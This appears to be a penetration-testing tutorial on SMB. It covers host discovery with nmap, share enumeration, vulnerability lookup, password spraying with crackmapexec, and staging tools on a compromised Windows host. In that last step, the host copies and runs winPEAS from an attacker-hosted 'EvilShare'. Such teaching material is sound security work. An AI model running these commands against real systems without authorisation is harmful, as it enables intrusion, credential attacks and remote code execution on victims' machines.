# SMB Enumeration & Interaction


# What is SMB?
{{< admonition type=info open=true >}}
Server Message Block (SMB)
{{< /admonition >}}
SMB has a pretty bad rep in regards to security espically with the recent, 2017, infamous exploit EternalBlue [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144).

But how can you find it, exploit it, and even use it to help with a red team engagement? Lets find out.
## Enumerating
Before you can do anything you need to discover shares on the network. From here you can try to see if any shares allow anonymous access or what restricted share exists. SMB can also disclose information about the host such as the operating system and current version.
### nmap
we can use nmap to scan across a network to try discover hosts with port 139 which is for the NetBIOS protocol which is a session layer allowing computers on a local network to talk with one another and port 445 for SMB.
{{< admonition type=note open=true >}}
It should be noted that SMB can work without NetBIOS but it is usually enabled for backwards compatibility.
{{< /admonition >}}
We've been tasked to complete a peneration test on the /24 network located at 10.10.10.1 using nmap to find smb will look like this:
```bash
nmap -p 139,445 10.10.10.1/24
```
This will return back a list of hosts that have those ports open.

### Discovering file sharing
Now we have a list of hosts with shares lets see if we can access them via anonymous sessions.
#### smbmap
[smbmap](https://github.com/ShawnDEvans/smbmap) is a great tool for listing out different shares on an SMB server to do so is as easy as passing it the IP address of the host.
```bash
smbmap -H 10.10.10.23
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.23...
[+] IP: 10.10.10.23:445	Name: hack.me
	Disk                                Permissions	    Comment
	----                                -----------	    -------
	ADMIN$                              NO ACCESS	    Remote Admin
	C$                                  NO ACCESS	    Default share
	IPC$                                NO ACCESS	    Remote IPC
	Users                               READ, WRITE
```
From this output we can see there exists several shares, *ADMIN*, *C*, *IPC* and *Users*. We can see via our anonymous access, we never gave smbmap a username and password, that we have read and write access to the *Users* share.

smbmap supports loads more features including specifying usernames and passwords and even executing commands!
#### smbclient
Another tool I really like to use is smbclient which is part of the fantastic [impacket](https://github.com/SecureAuthCorp/impacket) library.

To list share it's as simple as this:
```bash
echo exit | smbclient -L 10.10.10.23
```
{{< admonition type=note open=true >}}
Piping exit to smb client closes the password request as we're only looking for anonymous sessions at the moment
{{< /admonition >}}
You should recieve an output similar to smbmap. Again smbclient has many more features than just listing the shares. We will use it further on in this article for actually connecting to the share and interacting with it.

### Discovering SMB vulnrabilties
{{< figure src="https://thumbs.gfycat.com/JitteryPlasticBactrian-size_restricted.gif" title="nmap cameo appearence" >}}
There's a wealth of vulnrabilites with SMB and a lot of imformation out there on what version has which exploit. To quickly discover potentially exploits I like two methods.

#### Searchsploit
Searchsploit is a handy little cli tool. Parsing searchsploit a software and a version will return a list of known exploits.

```bash
searchsploit smb 2.1
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
MikroTik RouterOS < 6.41.3/6.42rc27 - SMB Buf | hardware/remote/44290.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```
A feature I love is ability to quickly *mirror* the result to my working directory. In the above snippet I an see a python file has been found. I can quickly copy it with the `-m` flag or if I want to quickly examine it `-x`.

```bash
searchspoit -m 44290
```

#### nmap scripting engine
Using nmaps scripting engine we can have it run scripts in hopes to discover potential vulnrabilties and get a wealth of information on them. Using a `*` is a good trick here to run all scripts related to smb vulns.

```bash
nmap -p 139,445 --script smb-vuln* 10.10.10.23
```

{{< admonition type=warning open=true >}}
We should avoid the usage of the `unsafe=1` flag with nmap as it's almost guerenteed to cause the host to crash.
{{< /admonition >}}

## Gaining access
If I find some creds in LDAP or via someother means and prehaps some potential users names. Which could be found from company email address or looking on website such as linked in for employees of a company. We could create a username and password lists. Using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) I can quickly spray all permutations of usernames and passwords to see if i can gain authenticated access to shares.

```bash
crackmapexec smb 10.10.10.23 -u user.list -p password.list
```
## Interacting with a SMB share
As privously mentioned smbclient has additional features those include actually interacting with shares.

```bash
smbclient \\\\10.10.10.23\\Users
smb:\>
```
I can now use normal commands such as `cd` `ls` and `get` to download a remote file or `put` to upload a file from my working directory to the share.


## Using your own SMB share to transfer files to a windows host
Okay, you've establised a foothold on a windows machine and now you want to copy over your tools such as [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to discover low hanging fruit that could esculate our privileges. We can use the hosts `cmd.exe` `copy` command to grab files from our own share.

[impacket](https://github.com/SecureAuthCorp/impacket) comes with it's own smbserver. Lets create a share on our Kali machine by spesifying the share name and the directory to mount to it.

```bash
smbserver EvilShare /opt/tools
```

Now lets copy over winPEAS from the share where the IP address is the IP of our Kali machine.

```dos
C:\> copy \\10.10.11.2\EvilShare\winPEAS.exe .
```

We can also directly execute the binary straight from the share.
```dos
C:\>  \\10.10.11.2\EvilShare\winPEAS.exe
```

## In Summary
SMB might not always be exploitable but it can still be a power tool for not only extracting data from a host but we can also use it for transfering our own data from our local machine to a windows host.

I think you should always get excited if you see smb is open on a machine and it is always a good place to start enumerating futher. I hope this post helps facilitate that.

